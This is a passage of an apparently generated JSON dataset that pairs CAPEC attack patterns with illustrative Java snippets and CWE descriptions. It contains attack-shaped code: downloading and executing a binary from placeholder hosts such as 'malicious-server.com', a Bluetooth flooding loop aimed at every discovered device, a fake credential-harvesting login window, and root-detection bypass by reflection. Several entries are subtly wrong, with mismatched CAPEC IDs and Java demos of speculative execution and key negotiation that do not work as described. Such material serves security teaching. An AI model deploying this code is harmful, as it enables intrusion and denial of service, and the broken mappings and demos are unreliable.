        "description": "This Java code snippet demonstrates a basic eavesdropping scenario where audio data is captured from a microphone and transmitted over a cleartext channel. The code opens a microphone line, reads audio data into a buffer, and then simulates sending this data over an unencrypted channel. This embodies the CAPEC concept of eavesdropping by capturing raw audio and exposing it to unauthorized actors. The related CWEs are represented as follows: CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) is shown by capturing and transmitting audio data without proper authorization; CWE-319 (Cleartext Transmission of Sensitive Information) is demonstrated by sending the captured audio data in cleartext; CWE-514 and CWE-515 (Covert Channels) are implied by the potential misuse of the audio data transmission; and CWE-1300 (Improper Protection of Physical Side Channels) is represented by the lack of protection mechanisms for the captured audio data."
    },
    {
        "capec_id": "652",
        "capec_name": "Use of Known Kerberos Credentials",
        "code_snippet": "import java.io.IOException;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class VulnerableKerberosAuth {\n    private static Map<String, String> credentials = new HashMap<>();\n\n    static {\n        // Storing credentials insecurely\n        credentials.put(\"serviceAccount\", \"password123\");\n    }\n\n    public static void main(String[] args) throws IOException {\n        ServerSocket serverSocket = new ServerSocket(8080);\n        while (true) {\n            Socket clientSocket = serverSocket.accept();\n            handleClient(clientSocket);\n        }\n    }\n\n    private static void handleClient(Socket clientSocket) throws IOException {\n        // Simulate receiving Kerberos ticket (insecurely)\n        byte[] ticket = new byte[256];\n        clientSocket.getInputStream().read(ticket);\n\n        // Vulnerable to replay attacks\n        if (isValidTicket(ticket)) {\n            System.out.println(\"Authenticated successfully\");\n        } else {\n            System.out.println(\"Authentication failed\");\n        }\n    }\n\n    private static boolean isValidTicket(byte[] ticket) {\n        // Simplified and insecure ticket validation\n        String receivedTicket = new String(ticket).trim();\n        return credentials.containsValue(receivedTicket);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable implementation of Kerberos authentication. It embodies the main idea of CAPEC-Use of Known Kerberos Credentials by showing how an adversary could exploit insecurely stored credentials and replay attacks. The code stores credentials in a HashMap without proper protection (CWE-522), uses single-factor authentication (CWE-308), and is susceptible to replay attacks (CWE-294). The `handleClient` method simulates receiving a Kerberos ticket and validates it in an insecure manner, making it easy for an attacker to bypass authentication by replaying a captured ticket."
    },
    {
        "capec_id": "653",
        "capec_name": "Use of Known Operating System Credentials",
        "code_snippet": "import java.util.Scanner;\n\npublic class VulnerableLogin {\n    private static final String USERNAME = \"admin\";\n    private static final String PASSWORD = \"password123\"; // CWE-522: Insufficiently Protected Credentials\n\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.print(\"Enter username: \");\n        String inputUsername = scanner.nextLine();\n        System.out.print(\"Enter password: \");\n        String inputPassword = scanner.nextLine();\n\n        if (authenticate(inputUsername, inputPassword)) {\n            System.out.println(\"Login successful!\");\n        } else {\n            System.out.println(\"Login failed!\");\n        }\n    }\n\n    private static boolean authenticate(String username, String password) {\n        // CWE-308: Use of Single-factor Authentication\n        // CWE-309: Use of Password System for Primary Authentication\n        return USERNAME.equals(username) && PASSWORD.equals(password);\n    }\n}\n",
        "description": "This Java code snippet demonstrates a simple login system that embodies the main idea of CAPEC-Use of Known Operating System Credentials. The code uses hardcoded credentials (CWE-522: Insufficiently Protected Credentials) and relies on single-factor authentication (CWE-308: Use of Single-factor Authentication) with a password system as the primary means of authentication (CWE-309: Use of Password System for Primary Authentication). The code does not implement any measures to prevent multiple failed authentication attempts (CWE-307: Improper Restriction of Excessive Authentication Attempts) and does not use password aging mechanisms (CWE-262: Not Using Password Aging, CWE-263: Password Aging with Long Expiration). This makes the system vulnerable to adversaries who can guess or obtain the credentials to gain unauthorized access."
    },
    {
        "capec_id": "654",
        "capec_name": "Credential Prompt Impersonation",
        "code_snippet": "import javax.swing.*;\nimport java.awt.*;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\n\npublic class CredentialPromptImpersonation {\n    public static void main(String[] args) {\n        JFrame frame = new JFrame(\"Login\");\n        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        frame.setSize(300, 150);\n\n        JPanel panel = new JPanel();\n        frame.add(panel);\n        placeComponents(panel);\n\n        frame.setVisible(true);\n    }\n\n    private static void placeComponents(JPanel panel) {\n        panel.setLayout(null);\n\n        JLabel userLabel = new JLabel(\"User\");\n        userLabel.setBounds(10, 20, 80, 25);\n        panel.add(userLabel);\n\n        JTextField userText = new JTextField(20);\n        userText.setBounds(100, 20, 165, 25);\n        panel.add(userText);\n\n        JLabel passwordLabel = new JLabel(\"Password\");\n        passwordLabel.setBounds(10, 50, 80, 25);\n        panel.add(passwordLabel);\n\n        JPasswordField passwordText = new JPasswordField(20);\n        passwordText.setBounds(100, 50, 165, 25);\n        panel.add(passwordText);\n\n        JButton loginButton = new JButton(\"login\");\n        loginButton.setBounds(10, 80, 80, 25);\n        panel.add(loginButton);\n\n        loginButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n                String user = userText.getText();\n                String password = new String(passwordText.getPassword());\n                // Simulate storing credentials insecurely\n                System.out.println(\"User: \" + user + \", Password: \" + password);\n            }\n        });\n    }\n}",
        "description": "This Java code snippet creates a simple GUI application that impersonates a login prompt. The application collects a username and password from the user and prints them to the console, simulating insecure storage of credentials. This example embodies the CAPEC 'Credential Prompt Impersonation' by demonstrating how an adversary could create a fake login prompt to steal user credentials. The code also touches on related CWEs: it does not properly restrict UI layers (CWE-1021), it stores credentials insecurely (CWE-522), and it could potentially use hard-coded or weak credentials (CWE-798, CWE-1391)."
    },
    {
        "capec_id": "655",
        "capec_name": "Avoid Security Tool Identification by Adding Data",
        "code_snippet": "import java.io.File;\nimport java.io.FileWriter;\nimport java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class FileManipulation {\n    public static void main(String[] args) {\n        String filePath = \"sensitive_data.txt\";\n        String tempFilePath = \"temp_data.txt\";\n        String sensitiveData = \"username=admin\\npassword=secret\";\n\n        try {\n            // Create a file with sensitive information\n            FileWriter writer = new FileWriter(filePath);\n            writer.write(sensitiveData);\n            writer.close();\n\n            // Add data to the file to change its hash and increase its size\n            FileWriter tempWriter = new FileWriter(tempFilePath);\n            for (int i = 0; i < 10000; i++) {\n                tempWriter.write(\"A\");\n            }\n            tempWriter.close();\n\n            // Append the temp file content to the original file\n            Files.write(Paths.get(filePath), Files.readAllBytes(Paths.get(tempFilePath)), java.nio.file.StandardOpenOption.APPEND);\n\n            // Clean up temporary file\n            new File(tempFilePath).delete();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Avoid Security Tool Identification by Adding Data' by manipulating a file to increase its size and change its hash. The code creates a file containing sensitive information (CWE-541), then appends a large amount of data to it to alter its hash and size. This can potentially bypass security tools that rely on file size or hash for detection. Additionally, the code uses a temporary file (CWE-377) to store the extra data before appending it to the original file, which can be insecure if not handled properly."
    },
    {
        "capec_id": "656",
        "capec_name": "Voice Phishing",
        "code_snippet": "import java.util.Scanner;\n\npublic class VoicePhishingExample {\n    public static void main(String[] args) {\n        Scanner scanner = new Scanner(System.in);\n        System.out.println(\"Welcome to XYZ Bank. Please enter your account number:\");\n        String accountNumber = scanner.nextLine();\n        System.out.println(\"Please enter your password:\");\n        String password = scanner.nextLine();\n        \n        // Simulate improper verification of the source of communication\n        if (verifyCredentials(accountNumber, password)) {\n            System.out.println(\"Access granted. Your balance is $10,000.\");\n        } else {\n            System.out.println(\"Access denied. Invalid credentials.\");\n        }\n    }\n\n    private static boolean verifyCredentials(String accountNumber, String password) {\n        // Simulate a simple check without proper verification\n        return \"123456\".equals(accountNumber) && \"password123\".equals(password);\n    }\n}",
        "description": "This Java code snippet simulates a voice phishing scenario where a user is prompted to enter their account number and password over a voice call. The code does not properly verify the source of the communication (CWE-940), uses a simple and insecure method to check credentials (CWE-522), and does not implement measures to prevent brute force attacks (CWE-307). The code represents the main idea of the CAPEC by showing how an adversary could solicit sensitive information from a user through a voice call, exploiting weaknesses in the verification and authentication process."
    },
    {
        "capec_id": "657",
        "capec_name": "Malicious Automated Software Update via Spoofing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousUpdate {\n    public static void main(String[] args) {\n        try {\n            // URL of the update server (spoofed by attacker)\n            URL url = new URL(\"http://malicious-server.com/update\");\n            HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n            conn.setRequestMethod(\"GET\");\n\n            // Check if the response code is 200 (OK)\n            if (conn.getResponseCode() == 200) {\n                InputStream in = conn.getInputStream();\n                FileOutputStream out = new FileOutputStream(\"update.exe\");\n\n                // Download the update file\n                byte[] buffer = new byte[1024];\n                int bytesRead;\n                while ((bytesRead = in.read(buffer)) != -1) {\n                    out.write(buffer, 0, bytesRead);\n                }\n                in.close();\n                out.close();\n\n                // Execute the downloaded update (without integrity check)\n                Runtime.getRuntime().exec(\"update.exe\");\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism that can be exploited by an attacker using spoofing techniques. The code attempts to download an update from a specified URL and execute it without verifying the origin or integrity of the downloaded file. This embodies the main idea of CAPEC-494 (Malicious Automated Software Update via Spoofing) and highlights related CWEs such as CWE-494 (Download of Code Without Integrity Check) and CWE-506 (Embedded Malicious Code). The code does not perform any checks to ensure the authenticity of the update source, making it susceptible to attacks where an attacker can trick the client into downloading and executing malicious code."
    },
    {
        "capec_id": "660",
        "capec_name": "Root/Jailbreak Detection Evasion via Hooking",
        "code_snippet": "import java.lang.reflect.Method;\n\npublic class RootDetectionBypass {\n    public static void main(String[] args) {\n        try {\n            // Load a potentially malicious library from an untrusted source\n            System.loadLibrary(\"untrustedLibrary\");\n\n            // Use reflection to hook into the root detection method\n            Class<?> rootCheckClass = Class.forName(\"com.example.RootCheck\");\n            Method isRootedMethod = rootCheckClass.getDeclaredMethod(\"isDeviceRooted\");\n            isRootedMethod.setAccessible(true);\n\n            // Bypass the root detection by returning false\n            Object result = isRootedMethod.invoke(null);\n            if ((boolean) result) {\n                System.out.println(\"Device is rooted. Bypassing check...\");\n                // Hook the method to always return false\n                Method hookMethod = rootCheckClass.getDeclaredMethod(\"setRooted\", boolean.class);\n                hookMethod.setAccessible(true);\n                hookMethod.invoke(null, false);\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates how an adversary might bypass root detection in a mobile application by using reflection to hook into and modify the behavior of a root detection method. The code first loads a potentially malicious library from an untrusted source (CWE-829). It then uses reflection to access and invoke the 'isDeviceRooted' method from a hypothetical 'RootCheck' class. If the device is detected as rooted, the code hooks into the method to alter its behavior, effectively bypassing the root detection (CWE-494). This allows the adversary to evade security checks and potentially execute administrative commands or access sensitive information (CWE-497)."
    },
    {
        "capec_id": "661",
        "capec_name": "Root/Jailbreak Detection Evasion via Debugging",
        "code_snippet": "import java.io.IOException;\n\npublic class RootDetection {\n    public static void main(String[] args) {\n        if (isDeviceRooted()) {\n            System.out.println(\"Device is rooted. Exiting application.\");\n            System.exit(1);\n        } else {\n            System.out.println(\"Device is not rooted. Continuing...\");\n        }\n    }\n\n    private static boolean isDeviceRooted() {\n        String[] paths = {\n            \"/system/app/Superuser.apk\",\n            \"/sbin/su\",\n            \"/system/bin/su\",\n            \"/system/xbin/su\",\n            \"/data/local/xbin/su\",\n            \"/data/local/bin/su\",\n            \"/system/sd/xbin/su\",\n            \"/system/bin/failsafe/su\",\n            \"/data/local/su\"\n        };\n        for (String path : paths) {\n            if (new java.io.File(path).exists()) {\n                return true;\n            }\n        }\n        return false;\n    }\n}",
        "description": "This Java code snippet demonstrates a basic root detection mechanism for a mobile application. The `isDeviceRooted` method checks for the presence of common root-related files on the device. If any of these files are found, the application assumes the device is rooted and exits. This code embodies the main idea of CAPEC-Root/Jailbreak Detection Evasion via Debugging by showing how an application might attempt to detect a rooted device. However, this detection can be evaded by an adversary using a debugger to modify the application binary, bypassing these checks. The code also touches on CWE-489 (Active Debug Code) as it could be bypassed if debugging is enabled, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) as it attempts to access system-level information to determine root status."
    },
    {
        "capec_id": "662",
        "capec_name": "Adversary in the Browser (AiTB)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        try {\n            URL url = new URL(\"http://example.com/malicious-code.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious-code.jar\");\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n\n            in.close();\n            fos.close();\n\n            Runtime.getRuntime().exec(\"java -jar malicious-code.jar\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable downloader that embodies the main idea of the CAPEC 'Adversary in the Browser (AiTB)'. The code downloads a JAR file from a remote location and executes it without verifying the origin and integrity of the code (CWE-494). This can be exploited by an adversary to manipulate traffic and execute malicious code. The code also lacks proper identity verification of the communication channel endpoints (CWE-300), and it relies on client-side actions to enforce security, which should be handled server-side (CWE-602). The snippet represents a scenario where an attacker can exploit these vulnerabilities to inject and execute malicious code, demonstrating the risks associated with AiTB."
    },
    {
        "capec_id": "663",
        "capec_name": "Exploitation of Transient Instruction Execution",
        "code_snippet": "public class TransientExecutionExample {\n    private static final int SECRET = 42; // Sensitive data\n    private static final int ARRAY_SIZE = 256;\n    private static final int[] cache = new int[ARRAY_SIZE];\n\n    public static void main(String[] args) {\n        int index = getIndex(); // Speculative execution may mispredict this\n        if (index < ARRAY_SIZE) {\n            // Transient execution may access SECRET\n            int value = cache[SECRET];\n            // Covert channel: cache timing side-channel\n            long startTime = System.nanoTime();\n            int temp = cache[value * 512];\n            long endTime = System.nanoTime();\n            System.out.println(\"Access time: \" + (endTime - startTime));\n        }\n    }\n\n    private static int getIndex() {\n        // Simulate branch prediction failure\n        return (int) (Math.random() * (ARRAY_SIZE + 1));\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified example of exploiting transient instruction execution to expose sensitive data. The main idea is to simulate speculative execution where the CPU may mispredict the branch and execute instructions that access sensitive data (SECRET) transiently. The code uses a cache timing side-channel to measure the access time, which can be used to infer the value of the sensitive data. This example embodies the CAPEC by showing how transient execution can lead to information exposure through microarchitectural state changes and covert channels."
    },
    {
        "capec_id": "664",
        "capec_name": "Server Side Request Forgery",
        "code_snippet": "import java.io.BufferedReader;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class SSRFExample {\n    public static void main(String[] args) {\n        try {\n            String userInput = args[0]; // Assume this comes from an untrusted source\n            URL url = new URL(userInput);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n\n            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));\n            String inputLine;\n            StringBuilder content = new StringBuilder();\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n            }\n            in.close();\n            connection.disconnect();\n\n            System.out.println(content.toString());\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Server-Side Request Forgery (SSRF) vulnerability. The code takes a URL from user input (which is assumed to be untrusted) and makes an HTTP GET request to that URL. The response is then read and printed out. This code is vulnerable because it does not validate the user input, allowing an attacker to craft a malicious URL that could force the server to make requests to internal services or external third parties with the server's privileges. This can lead to unauthorized access to sensitive data or other malicious actions. The code embodies CWE-918 (SSRF) and CWE-20 (Improper Input Validation) by not ensuring the request is sent to an expected destination and not validating the input properly."
    },
    {
        "capec_id": "665",
        "capec_name": "Exploitation of Thunderbolt Protection Flaws",
        "code_snippet": "import java.io.IOException;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\n\npublic class ThunderboltExploit {\n    private static final String FIRMWARE_PATH = \"/path/to/thunderbolt/firmware.bin\";\n    private static final String MALICIOUS_FIRMWARE = \"/path/to/malicious/firmware.bin\";\n\n    public static void main(String[] args) {\n        try {\n            // Insufficient Verification of Data Authenticity (CWE-345)\n            byte[] firmwareData = Files.readAllBytes(Paths.get(FIRMWARE_PATH));\n            if (verifyFirmware(firmwareData)) {\n                // Missing Support for Integrity Check (CWE-353)\n                byte[] maliciousData = Files.readAllBytes(Paths.get(MALICIOUS_FIRMWARE));\n                // Authentication Bypass Using an Alternate Path or Channel (CWE-288)\n                if (bypassAuthentication()) {\n                    // Missing Authorization (CWE-862)\n                    writeFirmware(maliciousData);\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean verifyFirmware(byte[] data) {\n        // Simulate insufficient verification\n        return true; // Always returns true, insufficient verification\n    }\n\n    private static boolean bypassAuthentication() {\n        // Simulate authentication bypass\n        return true; // Always returns true, bypassing authentication\n    }\n\n    private static void writeFirmware(byte[] data) throws IOException {\n        // Simulate writing malicious firmware\n        Files.write(Paths.get(FIRMWARE_PATH), data);\n    }\n}",
        "description": "This Java code snippet simulates an exploitation of Thunderbolt protection flaws by leveraging several common weaknesses. The code reads the original firmware and malicious firmware from specified paths. It then performs an insufficient verification of the firmware data (CWE-345), bypasses authentication (CWE-288), and writes the malicious firmware to the device without performing proper authorization checks (CWE-862). The code represents the main idea of the CAPEC by demonstrating how an adversary could manipulate Thunderbolt controller firmware to exploit vulnerabilities in the authorization and verification schemes."
    },
    {
        "capec_id": "666",
        "capec_name": "BlueSmacking",
        "code_snippet": "import javax.bluetooth.*;\nimport java.io.*;\nimport java.util.Vector;\n\npublic class BlueSmackingAttack {\n    public static void main(String[] args) throws IOException, BluetoothStateException {\n        LocalDevice localDevice = LocalDevice.getLocalDevice();\n        DiscoveryAgent agent = localDevice.getDiscoveryAgent();\n        Vector<RemoteDevice> devices = new Vector<>();\n\n        agent.startInquiry(DiscoveryAgent.GIAC, new DiscoveryListener() {\n            public void deviceDiscovered(RemoteDevice btDevice, DeviceClass cod) {\n                devices.add(btDevice);\n            }\n\n            public void inquiryCompleted(int discType) {\n                for (RemoteDevice device : devices) {\n                    try {\n                        L2CAPConnection connection = (L2CAPConnection) Connector.open(\"btl2cap://\" + device.getBluetoothAddress() + \":1001\");\n                        byte[] largePacket = new byte[65535]; // Large packet to flood the device\n                        connection.send(largePacket);\n                        connection.close();\n                    } catch (IOException e) {\n                        e.printStackTrace();\n                    }\n                }\n            }\n\n            public void serviceSearchCompleted(int transID, int respCode) {}\n            public void servicesDiscovered(int transID, ServiceRecord[] servRecord) {}\n        });\n    }\n}",
        "description": "This Java code snippet demonstrates a BlueSmacking attack, where an adversary uses Bluetooth flooding to transfer large packets to Bluetooth-enabled devices over the L2CAP protocol, aiming to create a Denial of Service (DoS). The code first discovers nearby Bluetooth devices and then attempts to open an L2CAP connection to each discovered device. It sends a large packet (65,535 bytes) to each device, which can overwhelm the target device's resources, leading to a DoS condition. This code also highlights CWE-404 (Improper Resource Shutdown or Release) as it does not properly handle resource cleanup, potentially leaving connections open. Additionally, it touches on CWE-319 (Cleartext Transmission of Sensitive Information) and CWE-924 (Improper Enforcement of Message Integrity During Transmission in a Communication Channel) by not ensuring secure and verified communication."
    },
    {
        "capec_id": "667",
        "capec_name": "Bluetooth Impersonation AttackS (BIAS)",
        "code_snippet": "import javax.bluetooth.*;\nimport java.io.IOException;\n\npublic class BluetoothImpersonationAttack {\n    public static void main(String[] args) {\n        try {\n            // Simulate an adversary's device with a spoofed MAC address\n            String spoofedMAC = \"00:11:22:33:44:55\";\n            RemoteDevice remoteDevice = new RemoteDevice(spoofedMAC) {\n                public String getFriendlyName(boolean alwaysAsk) throws IOException {\n                    return \"TrustedDevice\";\n                }\n            };\n\n            // Attempt to authenticate with the target device\n            boolean isAuthenticated = authenticate(remoteDevice);\n\n            if (isAuthenticated) {\n                System.out.println(\"Authentication successful. Malicious actions can be performed.\");\n                // Perform malicious actions here\n            } else {\n                System.out.println(\"Authentication failed.\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    private static boolean authenticate(RemoteDevice device) {\n        // Weak authentication mechanism\n        try {\n            String deviceName = device.getFriendlyName(false);\n            return \"TrustedDevice\".equals(deviceName);\n        } catch (IOException e) {\n            e.printStackTrace();\n            return false;\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a Bluetooth Impersonation Attack (BIAS) by simulating an adversary's device with a spoofed MAC address. The adversary's device attempts to authenticate with a target device using a weak authentication mechanism that only checks the device's friendly name. If the authentication is successful, the adversary can perform malicious actions on the target device. This code embodies the main idea of CAPEC-290 (Authentication Bypass by Spoofing) and related CWEs, such as CWE-940 (Improper Verification of Source of a Communication Channel) and CWE-1390 (Weak Authentication). The code highlights the vulnerability of using weak or improper authentication mechanisms that can be exploited by attackers to impersonate trusted devices."
    },
    {
        "capec_id": "668",
        "capec_name": "Key Negotiation of Bluetooth Attack (KNOB)",
        "code_snippet": "import javax.crypto.KeyGenerator;\nimport javax.crypto.SecretKey;\nimport javax.crypto.Cipher;\nimport java.security.SecureRandom;\nimport java.util.Arrays;\n\npublic class BluetoothKeyNegotiation {\n    public static void main(String[] args) throws Exception {\n        // Simulate key negotiation with low entropy\n        int entropyBits = 1; // Vulnerable: Low entropy bits\n        KeyGenerator keyGen = KeyGenerator.getInstance(\"AES\");\n        keyGen.init(128, new SecureRandom(new byte[entropyBits]));\n        SecretKey secretKey = keyGen.generateKey();\n\n        // Encrypt a sample message\n        Cipher cipher = Cipher.getInstance(\"AES\");\n        cipher.init(Cipher.ENCRYPT_MODE, secretKey);\n        byte[] encryptedMessage = cipher.doFinal(\"Sensitive Data\".getBytes());\n\n        System.out.println(\"Encrypted Message: \" + Arrays.toString(encryptedMessage));\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable Bluetooth key negotiation process where the entropy bits used for key generation are set to a very low value (1 bit). This simulates the Key Negotiation of Bluetooth Attack (KNOB) where an attacker can exploit the low entropy to decrypt the communication. The code uses the `KeyGenerator` class to generate a secret key with insufficient entropy, making it easy for an attacker to guess the key. The `Cipher` class is then used to encrypt a sample message, which would be insecure due to the weak key. This example highlights CWE-693 (Protection Mechanism Failure) and CWE-757 (Selection of Less-Secure Algorithm During Negotiation) by demonstrating the use of a weak protection mechanism and insufficient entropy in key generation."
    },
    {
        "capec_id": "669",
        "capec_name": "Alteration of a Software Update",
        "code_snippet": "import java.io.*;\nimport java.nio.file.*;\n\npublic class SoftwareUpdate {\n    public static void main(String[] args) {\n        String updateFilePath = \"path/to/update/file\";\n        try {\n            // Read the update file\n            byte[] updateContent = Files.readAllBytes(Paths.get(updateFilePath));\n            \n            // Malicious code injection\n            byte[] maliciousCode = \"malicious code\".getBytes();\n            byte[] compromisedUpdate = new byte[updateContent.length + maliciousCode.length];\n            System.arraycopy(updateContent, 0, compromisedUpdate, 0, updateContent.length);\n            System.arraycopy(maliciousCode, 0, compromisedUpdate, updateContent.length, maliciousCode.length);\n            \n            // Write the compromised update back to the file\n            Files.write(Paths.get(updateFilePath), compromisedUpdate);\n            System.out.println(\"Update file has been compromised.\");\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an adversary with access to an organization's software update infrastructure inserts malicious code into an outgoing update file. The code reads the original update file, appends malicious code to it, and writes the compromised update back to the file system. This embodies the CAPEC 'Alteration of a Software Update' by showing how an update can be tampered with to include malicious content. The related CWEs are represented as follows: CWE-506 (Embedded Malicious Code) is directly shown by the injection of 'malicious code', CWE-807 (Reliance on Untrusted Inputs in a Security Decision) is implied by the lack of validation or integrity checks on the update file, and CWE-527 (Exposure of Version-Control Repository to an Unauthorized Control Sphere) is suggested by the assumption that the adversary has unauthorized access to the update file."
    },
    {
        "capec_id": "670",
        "capec_name": "Software Development Tools Maliciously Altered",
        "code_snippet": "public class MaliciousToolExample {\n    public static void main(String[] args) {\n        // Simulate a maliciously altered compiler that removes security checks\n        boolean isAuthenticated = false;\n        \n        // Security-critical code that should not be optimized away\n        if (isAuthenticated) {\n            System.out.println(\"Access granted.\");\n        } else {\n            System.out.println(\"Access denied.\");\n        }\n        \n        // Malicious code injected by altered tool\n        executeMaliciousPayload();\n    }\n    \n    private static void executeMaliciousPayload() {\n        // Simulate malicious behavior\n        System.out.println(\"Executing malicious payload...\");\n        // Exposing sensitive system information\n        System.out.println(\"Sensitive Information: User credentials, System config\");\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Software Development Tools Maliciously Altered' (CAPEC) by simulating a scenario where a development tool, such as a compiler, has been maliciously altered. The main function includes a security-critical check (isAuthenticated) that should not be optimized away. However, due to the malicious alteration, this check could be removed or modified, leading to unauthorized access. Additionally, the altered tool injects a malicious payload that executes harmful actions, such as exposing sensitive system information. This example incorporates related CWEs, including CWE-506 (Embedded Malicious Code), CWE-733 (Compiler Optimization Removal or Modification of Security-critical Code), and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere)."
    },
    {
        "capec_id": "671",
        "capec_name": "Requirements for ASIC Functionality Maliciously Altered",
        "code_snippet": "public class ASICSecurity {\n    private String securityToken;\n    private String securityIdentifier;\n    private String confidentialInfo;\n\n    public ASICSecurity(String token, String identifier, String info) {\n        this.securityToken = token;\n        this.securityIdentifier = identifier;\n        this.confidentialInfo = info;\n    }\n\n    // CWE-1259: Improper Restriction of Security Token Assignment\n    public void setSecurityToken(String token) {\n        if (token == null || token.isEmpty()) {\n            throw new IllegalArgumentException(\"Invalid security token\");\n        }\n        this.securityToken = token;\n    }\n\n    // CWE-1294: Insecure Security Identifier Mechanism\n    public void setSecurityIdentifier(String identifier) {\n        if (identifier == null || identifier.isEmpty()) {\n            throw new IllegalArgumentException(\"Invalid security identifier\");\n        }\n        this.securityIdentifier = identifier;\n    }\n\n    // CWE-1297: Unprotected Confidential Information on Device is Accessible by OSAT Vendors\n    public String getConfidentialInfo() {\n        // Insecure access to confidential information\n        return this.confidentialInfo;\n    }\n\n    // CWE-1270: Generation of Incorrect Security Tokens\n    public String generateSecurityToken() {\n        // Incorrect token generation logic\n        return \"INCORRECT_TOKEN\";\n    }\n\n    // CWE-1263: Improper Physical Access Control\n    public void accessRestrictedArea() {\n        // No physical access control implemented\n        System.out.println(\"Accessing restricted area without proper control\");\n    }\n\n    public static void main(String[] args) {\n        ASICSecurity asic = new ASICSecurity(\"token123\", \"identifier123\", \"confidentialInfo123\");\n        asic.setSecurityToken(asic.generateSecurityToken());\n        System.out.println(\"Security Token: \" + asic.securityToken);\n        System.out.println(\"Confidential Info: \" + asic.getConfidentialInfo());\n        asic.accessRestrictedArea();\n    }\n}",
        "description": "This Java code snippet represents a simplified and vulnerable implementation of an ASIC security mechanism. The class `ASICSecurity` includes methods that embody the vulnerabilities described in the related CWEs. The `setSecurityToken` and `setSecurityIdentifier` methods demonstrate improper restriction and insecure implementation of security tokens and identifiers. The `getConfidentialInfo` method shows how confidential information can be accessed insecurely. The `generateSecurityToken` method illustrates the generation of incorrect security tokens. Finally, the `accessRestrictedArea` method represents a lack of physical access control. This code highlights how maliciously altered requirements can lead to an ASIC that does not meet security needs and contains vulnerabilities."
    },
    {
        "capec_id": "672",
        "capec_name": "Malicious Code Implanted During Chip Programming",
        "code_snippet": "public class MaliciousChipProgramming {\n    private static final int SECRET_KEY = 0xDEADBEEF; // CWE-506: Embedded Malicious Code\n    private static final int CONTROL_REGISTER = 0x1000; // CWE-1262: Improper Access Control for Register Interface\n    private static final int SECURITY_TOKEN = 0x1; // CWE-1259: Improper Restriction of Security Token Assignment\n\n    public static void main(String[] args) {\n        // CWE-509: Replicating Malicious Code\n        if (isCompromised()) {\n            replicateMaliciousCode();\n        }\n\n        // CWE-1423: Exposure of Sensitive Information\n        int sensitiveData = readSensitiveData();\n        if (sensitiveData != 0) {\n            exfiltrateData(sensitiveData);\n        }\n    }\n\n    private static boolean isCompromised() {\n        // Check if the system is compromised\n        return true; // Simplified for demonstration\n    }\n\n    private static void replicateMaliciousCode() {\n        // Code to replicate the malicious payload\n        System.out.println(\"Replicating malicious code...\");\n    }\n\n    private static int readSensitiveData() {\n        // Read sensitive data from a shared microarchitectural predictor state\n        return SECRET_KEY; // Simplified for demonstration\n    }\n\n    private static void exfiltrateData(int data) {\n        // Exfiltrate the sensitive data\n        System.out.println(\"Exfiltrating data: \" + data);\n    }\n\n    private static void accessControlRegister() {\n        // Improper access control to a memory-mapped I/O register\n        int registerValue = CONTROL_REGISTER;\n        System.out.println(\"Accessing control register: \" + registerValue);\n    }\n\n    private static void assignSecurityToken() {\n        // Improper restriction of security token assignment\n        int token = SECURITY_TOKEN;\n        System.out.println(\"Assigning security token: \" + token);\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where malicious code is implanted during the chip programming phase, embodying the main idea of the CAPEC. The code includes several vulnerabilities: CWE-506 (Embedded Malicious Code) with a hardcoded secret key, CWE-509 (Replicating Malicious Code) with a method to replicate the malicious payload, CWE-1423 (Exposure of Sensitive Information) by reading and exfiltrating sensitive data, CWE-1262 (Improper Access Control for Register Interface) by accessing a control register without proper checks, and CWE-1259 (Improper Restriction of Security Token Assignment) by assigning a security token without proper protection. This snippet illustrates how an adversary could manipulate the chip's program logic to achieve malicious objectives."
    },
    {
        "capec_id": "673",
        "capec_name": "Developer Signing Maliciously Altered Software",
